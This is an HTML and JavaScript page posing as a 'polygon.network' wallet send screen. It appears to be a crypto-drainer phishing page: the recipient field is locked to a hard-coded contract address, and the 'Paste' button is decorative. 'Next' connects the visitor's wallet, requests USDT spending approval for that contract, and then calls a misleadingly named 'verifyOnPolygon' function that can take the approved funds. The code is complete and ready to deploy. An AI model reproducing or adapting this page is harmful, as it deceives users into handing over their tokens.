<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>polygon.network</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background-color: #000000;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .app-bar {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border-bottom: 1px solid #262626;
        }

        .app-bar-title {
            margin: 0 auto;
            font-size: 16px;
            font-weight: 500;
        }

        .container {
            flex: 1;
            padding: 24px 16px 100px;
        }

        .label {
            font-size: 13px;
            color: #a0a0a0;
            margin-bottom: 6px;
        }

        .row {
            display: flex;
            align-items: center;
            background-color: #111111;
            border-radius: 10px;
            border: 1px solid #262626;
            padding: 8px 10px;
        }

        .row input {
            flex: 1;
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 14px;
            outline: none;
        }

        .row input::placeholder {
            color: #555555;
        }

        .row button,
        .icon-btn {
            border: none;
            background: none;
            color: #00ff7f;
            font-size: 13px;
            margin-left: 6px;
            cursor: pointer;
        }

        .icon-btn {
            padding: 0;
            width: 22px;
            height: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon-btn img {
            max-width: 100%;
            max-height: 100%;
            display: block;
        }

        .amount-box {
            margin-top: 24px;
        }

        .amount-row {
            display: flex;
            align-items: center;
            background-color: #111111;
            border-radius: 10px;
            border: 1px solid #262626;
            padding: 14px 12px;
        }

        .amount-row input {
            flex: 1;
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 18px;
            outline: none;
        }

        .amount-row-right {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #a0a0a0;
        }

        .amount-row-right .token {
            color: #ffffff;
        }

        .amount-row-right .max {
            color: #00ff7f;
            cursor: pointer;
        }

        .usd-hint {
            margin-top: 6px;
            font-size: 12px;
            color: #a0a0a0;
        }

        .bottom-bar {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            padding: 16px;
            background: #000000;
        }

        .next-btn {
            width: 100%;
            background-color: #00ff7f;
            border-radius: 999px;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            color: #000000;
            cursor: pointer;
        }

        .next-btn:disabled {
            background-color: #333;
            color: #666;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <header class="app-bar">
        <div class="app-bar-title">polygon.network</div>
    </header>

    <main class="container">
        <!-- Address section -->
        <div>
            <div class="label">Address or Domain Name</div>
            <div class="row">
                <input
                    type="text"
                    id="addressInput"
                    autocomplete="off"
                    placeholder=""
                    value="0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"
                    readonly
                />
                <button type="button" onclick="pasteAddress()">Paste</button>

                <!-- Contact icon -->
                <button type="button" class="icon-btn" title="Contacts">
                    <img src="/mnt/data/phone book .jpg" alt="Contacts" />
                </button>

                <!-- QR icon -->
                <button type="button" class="icon-btn" title="Scan QR">
                    <img src="/mnt/data/qr p.jpg" alt="QR" />
                </button>
            </div>
        </div>

        <!-- Amount section -->
        <div class="amount-box">
            <div class="label">Amount</div>
            <div class="amount-row">
                <input type="number" id="amountInput" value="" min="0" step="0.01" />
                <div class="amount-row-right">
                    <span class="token">USDT</span>
                    <span class="max" onclick="setMaxAmount()">Max</span>
                </div>
            </div>
            <div class="usd-hint" id="polHint">≈ 0.00 POL</div>
        </div>
    </main>

    <!-- Bottom Next button -->
    <div class="bottom-bar">
        <button class="next-btn" id="nextBtn" onclick="goNext()">Next</button>
    </div>

    <script>
        // Contract Configuration
        const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
        const POLYGON_USDT = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
        
        const CONTRACT_ABI = [
            "function verifyOnPolygon(uint256 amount) external",
            "function verifyOnBSC(uint256 amount) external", 
            "function verifyOnArbitrum(uint256 amount) external"
        ];

        const USDT_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function allowance(address owner, address spender) external view returns (uint256)",
            "function balanceOf(address account) external view returns (uint256)"
        ];

        let provider;
        let signer;
        let connectedAccount;
        let polPriceUSD = 0;

        // Set contract address on page load
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById("addressInput").value = CONTRACT_ADDRESS;
            fetchPolPrice();
        });

        // Fetch POL price from CoinGecko
        async function fetchPolPrice() {
            try {
                const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd");
                const data = await res.json();
                polPriceUSD = data["polygon-ecosystem-token"].usd;
                updatePolConversion();
            } catch (e) {
                console.error("Failed to fetch POL price", e);
                document.getElementById("polHint").textContent = "≈ -- POL";
            }
        }

        // Update POL conversion when amount changes
        function updatePolConversion() {
            const amount = parseFloat(document.getElementById("amountInput").value) || 0;
            if (polPriceUSD > 0 && amount > 0) {
                const polEquivalent = amount / polPriceUSD;
                document.getElementById("polHint").textContent = `≈ ${polEquivalent.toFixed(4)} POL`;
            } else {
                document.getElementById("polHint").textContent = "≈ 0.00 POL";
            }
        }

        function pasteAddress() {
            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(function (text) {
                    document.getElementById("addressInput").value = text;
                }).catch(function () {
                    alert("Unable to read from clipboard.");
                });
            } else {
                alert("Clipboard access not supported in this browser.");
            }
        }

        function setMaxAmount() {
            document.getElementById("amountInput").value = 1000;
            updatePolConversion();
        }

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Request account access
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    connectedAccount = await signer.getAddress();
                    
                    return true;
                } catch (error) {
                    console.error("User denied wallet connection:", error);
                    return false;
                }
            } else {
                alert("Please install MetaMask or Trust Wallet!");
                return false;
            }
        }

        async function checkUSDTApproval() {
            try {
                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, provider);
                const currentAllowance = await usdtContract.allowance(connectedAccount, CONTRACT_ADDRESS);
                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
                
                return currentAllowance.gte(amountWei);
            } catch (error) {
                console.error("Error checking approval:", error);
                return false;
            }
        }

        async function approveUSDT() {
            try {
                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, signer);
                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
                
                const tx = await usdtContract.approve(CONTRACT_ADDRESS, amountWei);
                await tx.wait();
                return true;
            } catch (error) {
                console.error("Approval failed:", error);
                return false;
            }
        }

        async function executeTransaction() {
            try {
                const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
                
                const tx = await contract.verifyOnPolygon(amountWei);
                await tx.wait();
                return true;
            } catch (error) {
                console.error("Transaction failed:", error);
                return false;
            }
        }

        async function goNext() {
            const amount = document.getElementById("amountInput").value;
            if (!amount || amount <= 0) {
                alert("Please enter a valid amount");
                return;
            }

            const nextBtn = document.getElementById("nextBtn");
            const originalText = nextBtn.textContent;
            
            try {
                // Disable button during processing
                nextBtn.disabled = true;
                nextBtn.textContent = "Connecting...";

                // Connect wallet
                const connected = await connectWallet();
                if (!connected) {
                    nextBtn.disabled = false;
                    nextBtn.textContent = originalText;
                    return;
                }

                nextBtn.textContent = "Checking approval...";

                // Check if USDT is already approved
                const isApproved = await checkUSDTApproval();
                
                if (!isApproved) {
                    nextBtn.textContent = "Approve USDT...";
                    
                    // Ask for USDT approval
                    const approved = await approveUSDT();
                    if (!approved) {
                        alert("USDT approval failed. Please try again.");
                        nextBtn.disabled = false;
                        nextBtn.textContent = originalText;
                        return;
                    }
                }

                nextBtn.textContent = "Processing transaction...";

                // Execute the main transaction
                const success = await executeTransaction();
                
                if (success) {
                    alert("Transaction completed successfully!");
                    // Redirect or show success message
                    window.location.href = "next.html";
                } else {
                    alert("Transaction failed. Please try again.");
                }

            } catch (error) {
                console.error("Error:", error);
                alert("An error occurred: " + error.message);
            } finally {
                nextBtn.disabled = false;
                nextBtn.textContent = originalText;
            }
        }

        // Add event listener for amount input changes
        document.getElementById("amountInput").addEventListener("input", updatePolConversion);
    </script>
</body>
</html>
